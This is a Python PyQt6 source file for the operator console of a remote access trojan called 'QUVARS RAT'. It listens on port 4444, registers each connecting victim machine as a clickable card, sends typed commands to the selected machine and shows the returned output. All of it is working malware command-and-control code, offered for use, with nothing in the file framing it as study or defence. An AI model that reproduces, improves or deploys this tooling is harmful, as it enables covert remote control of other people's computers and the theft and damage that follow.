import socket
import threading
import sys
import time
from PyQt6.QtWidgets import *
from PyQt6.QtCore import pyqtSignal, QObject, Qt
from PyQt6.QtGui import QCursor

class Comm(QObject):
    client_connected = pyqtSignal(str, str, object)
    data_received = pyqtSignal(str)
    connection_lost = pyqtSignal(str)

class ClientCard(QFrame):
    def __init__(self, ip, client_id, callback):
        super().__init__()
        self.setFixedSize(320, 110)
        self.callback = callback
        self.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        
        self.setObjectName("Card")
        self.setStyleSheet("""
            #Card {
                background-color: #1E1E1E;
                border: 1px solid #2D2D2D;
                border-radius: 10px;
            }
            #Card:hover {
                background-color: #252525;
                border: 1px solid #404040;
            }
        """)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 15, 20, 15)
        
        name_label = QLabel(client_id.upper())
        name_label.setStyleSheet("color: #FFFFFF; font-size: 14px; font-weight: 700; border:none;")
        
        ip_label = QLabel(f"IP: {ip}")
        ip_label.setStyleSheet("color: #707070; font-size: 11px; font-family: 'Segoe UI'; border:none;")
        
        status_label = QLabel("● ONLINE")
        status_label.setStyleSheet("color: #A0A0A0; font-size: 9px; font-weight: 800; margin-top: 5px;")
        
        layout.addWidget(name_label)
        layout.addWidget(ip_label)
        layout.addStretch()
        layout.addWidget(status_label)

    def mousePressEvent(self, event):
        self.callback()

class ServerPanel(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("QUVARS RAT")
        self.setFixedSize(950, 680)
        self.setStyleSheet("background-color: #121212; color: #E0E0E0;")
        
        self.clients = {} 
        self.client_widgets = {}
        self.active_id = None
        
        self.comm = Comm()
        self.comm.client_connected.connect(self.add_client_card)
        self.comm.data_received.connect(self.update_terminal)
        self.comm.connection_lost.connect(self.remove_client)

        self.stack = QStackedWidget()
        self.setCentralWidget(self.stack)
        
        self.init_main_list_page()
        self.init_control_page()
        
        threading.Thread(target=self.start_listener, daemon=True).start()
        threading.Thread(target=self.auto_cleanup_worker, daemon=True).start()

    def init_main_list_page(self):
        self.list_page = QWidget()
        layout = QVBoxLayout(self.list_page)
        layout.setContentsMargins(60, 60, 60, 60)
        
        header = QLabel("QUVARS RAT")
        header.setStyleSheet("font-size: 36px; font-weight: 800; letter-spacing: 5px; color: #FFFFFF;")
        layout.addWidget(header)
        
        sub = QLabel("MANAGEMENT CONSOLE")
        sub.setStyleSheet("font-size: 10px; color: #444; font-weight: bold; letter-spacing: 2px;")
        layout.addWidget(sub)
        layout.addSpacing(40)
        
        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setStyleSheet("border: none; background: transparent;")
        
        self.card_container = QWidget()
        self.card_layout = QGridLayout(self.card_container)
        self.card_layout.setSpacing(20)
        self.card_layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        
        self.placeholder = QLabel("WAITING FOR CONNECTIONS...")
        self.placeholder.setStyleSheet("color: #2A2A2A; font-size: 13px; font-weight: 600; letter-spacing: 2px;")
        self.placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.card_layout.addWidget(self.placeholder)

        self.scroll.setWidget(self.card_container)
        layout.addWidget(self.scroll)
        self.stack.addWidget(self.list_page)

    def init_control_page(self):
        self.control_page = QWidget()
        layout = QVBoxLayout(self.control_page)
        layout.setContentsMargins(0, 0, 0, 0)
        
        nav = QFrame()
        nav.setFixedHeight(80)
        nav.setStyleSheet("background-color: #181818; border-bottom: 1px solid #252525;")
        nav_layout = QHBoxLayout(nav)
        nav_layout.setContentsMargins(40, 0, 40, 0)
        
        btn_back = QPushButton("BACK")
        btn_back.setCursor(Qt.CursorShape.PointingHandCursor)
        btn_back.setStyleSheet("QPushButton { background: transparent; border: 1px solid #333; color: #888; font-size: 10px; font-weight: bold; padding: 8px 15px; border-radius: 5px; } QPushButton:hover { border-color: #FFF; color: #FFF; }")
        btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        
        self.nav_info = QLabel("")
        self.nav_info.setStyleSheet("font-weight: 700; font-size: 12px; color: #FFFFFF;")
        
        nav_layout.addWidget(btn_back)
        nav_layout.addStretch()
        nav_layout.addWidget(self.nav_info)
        
        self.terminal_output = QTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setStyleSheet("background-color: #121212; color: #B0B0B0; border: none; padding: 40px; font-family: 'Consolas'; font-size: 13px; line-height: 22px;")
        
        self.input_area = QFrame()
        self.input_area.setFixedHeight(80)
        self.input_area.setStyleSheet("background: #181818; border-top: 1px solid #252525;")
        input_layout = QHBoxLayout(self.input_area)
        input_layout.setContentsMargins(40, 0, 40, 0)
        
        self.cmd_input = QLineEdit()
        self.cmd_input.setStyleSheet("background: transparent; border: none; color: #FFFFFF; font-family: 'Consolas'; font-size: 14px;")
        self.cmd_input.setPlaceholderText("Execute command...")
        self.cmd_input.returnPressed.connect(self.send_command)
        
        input_layout.addWidget(self.cmd_input)
        layout.addWidget(nav)
        layout.addWidget(self.terminal_output)
        layout.addWidget(self.input_area)
        self.stack.addWidget(self.control_page)

    def auto_cleanup_worker(self):
        while True:
            time.sleep(3)
            for fid, conn in list(self.clients.items()):
                try: conn.send(b'') 
                except: self.comm.connection_lost.emit(fid)

    def start_listener(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', 4444))
        s.listen(50)
        while True:
            try:
                conn, addr = s.accept()
                conn.send("AUTH_REQ".encode('utf-8'))
                conn.settimeout(2.0)
                cid = conn.recv(1024).decode('utf-8', errors='ignore').strip()
                if not cid or "AUTH_REQ" in cid: # Hatalı ID'leri engelle
                    conn.close()
                    continue
                conn.settimeout(None)
                self.comm.client_connected.emit(addr[0], cid, conn)
            except: pass

    def add_client_card(self, ip, cid, conn):
        full_id = f"{cid}@{ip}"
        if full_id in self.clients: return
        self.placeholder.hide()
        self.clients[full_id] = conn
        card = ClientCard(ip, cid, lambda: self.open_client(full_id))
        self.client_widgets[full_id] = card
        row, col = divmod(len(self.clients)-1, 2)
        self.card_layout.addWidget(card, row, col)

    def open_client(self, full_id):
        self.active_id = full_id
        self.nav_info.setText(full_id.replace("@", " // "))
        self.terminal_output.clear()
        self.stack.setCurrentIndex(1)
        threading.Thread(target=self.receiver, args=(self.clients[full_id], full_id), daemon=True).start()

    def remove_client(self, full_id):
        if full_id in self.clients:
            try: self.clients[full_id].close()
            except: pass
            del self.clients[full_id]
        if full_id in self.client_widgets:
            w = self.client_widgets[full_id]
            self.card_layout.removeWidget(w)
            w.deleteLater()
            del self.client_widgets[full_id]
        if not self.clients: self.placeholder.show()
        if self.active_id == full_id: self.stack.setCurrentIndex(0)

    def send_command(self):
        cmd = self.cmd_input.text().strip()
        if cmd and self.active_id:
            try:
                self.clients[self.active_id].send(cmd.encode('utf-8'))
                self.terminal_output.append(f"<span style='color: #555;'>❯</span> <b>{cmd}</b>")
                self.cmd_input.clear()
            except: self.comm.connection_lost.emit(self.active_id)

    def receiver(self, conn, full_id):
        while True:
            try:
                data = conn.recv(65536).decode('utf-8', errors='ignore')
                if not data: break
                self.comm.data_received.emit(f"<pre style='color: #D0D0D0;'>{data}</pre>")
            except: break
        self.comm.connection_lost.emit(full_id)

    def update_terminal(self, text):
        self.terminal_output.append(text)
        self.terminal_output.verticalScrollBar().setValue(self.terminal_output.verticalScrollBar().maximum())

if __name__ == "__main__":
    app = QApplication(sys.argv)
    ex = ServerPanel()
    ex.show()
    sys.exit(app.exec())